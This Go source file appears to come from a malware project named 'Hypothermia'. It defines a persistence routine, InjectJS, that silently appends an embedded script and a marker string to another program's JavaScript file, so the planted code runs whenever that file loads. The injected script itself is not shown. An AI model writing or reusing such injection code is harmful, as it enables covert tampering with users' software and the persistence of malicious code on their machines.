package utils_persist

import (
	"embed"
	"fmt"
	"os"
	"strings"

	"Hypothermia/config"
)

//go:embed script.js
var scriptFile embed.FS

func InjectJS(file string) error {
	data, err := os.ReadFile(file)
	if err != nil {
		return err
	}

	dataStr := string(data)
	if strings.Contains(dataStr, config.Identifier) {
		return fmt.Errorf("file already injected")
	}

	script, err := scriptFile.ReadFile("script.js")
	if err != nil {
		return err
	}

	dataStr += "\n;" + fmt.Sprintf("\"%s\";", config.Identifier) + string(script)
	err = os.WriteFile(file, []byte(dataStr), 0644)
	if err != nil {
		return err
	}

	return nil
}
